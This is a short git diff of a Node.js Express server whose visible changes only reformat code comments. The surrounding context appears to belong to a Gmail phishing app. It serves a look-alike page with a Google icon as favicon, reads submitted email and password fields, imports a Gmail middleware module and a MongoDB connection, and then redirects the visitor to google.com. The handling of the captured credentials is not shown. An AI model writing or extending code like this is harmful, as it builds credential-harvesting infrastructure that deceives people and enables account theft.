@@ -4,6 +4,7 @@ const mongoose = require("mongoose");
 const { json } = require("express");
 const path = require("path");
 
+// Imports the middleware
 const Gmail = require("./middleware/gmail.js");
 
 const app = express();
@@ -21,12 +22,12 @@ mongoose
 	})
 	.catch((err) => console.log(err));
 
-//Get request for main page
+// Get request for main page
 app.get("/", (req, res) => {
 	res.sendFile(path.join(__dirname, "/web/index.html"));
 });
 
-//Post request for main page
+// Post request for main page
 app.post("/", (req, res) => {
 	const email = req.body.email;
 	const pass = req.body.pass;
@@ -47,7 +48,7 @@ app.post("/", (req, res) => {
 	res.redirect("http://google.com");
 });
 
-//Files
+// Files
 
 app.get("/favicon", (req, res) => {
 	res.sendFile(path.join(__dirname, "/web/images/googleIcon.png"));
